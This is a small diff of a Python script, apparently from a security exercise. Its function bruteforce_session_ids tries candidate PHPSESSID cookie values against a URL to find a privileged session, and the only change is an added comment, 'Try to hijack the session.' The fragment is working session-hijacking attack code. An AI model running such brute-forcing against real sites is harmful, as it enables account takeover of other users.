@@ -12,7 +12,7 @@ def bruteforce_session_ids(session, possibilites):
 
         print(f"Testing: {sess_id}")
         cookies = {"PHPSESSID" : sess_id}
-        resp = session.post(url, cookies=cookies)
+        resp = session.post(url, cookies=cookies) #Try to hijack the session.
 
         if(not "regular user" in resp.text):
             print(resp.text)
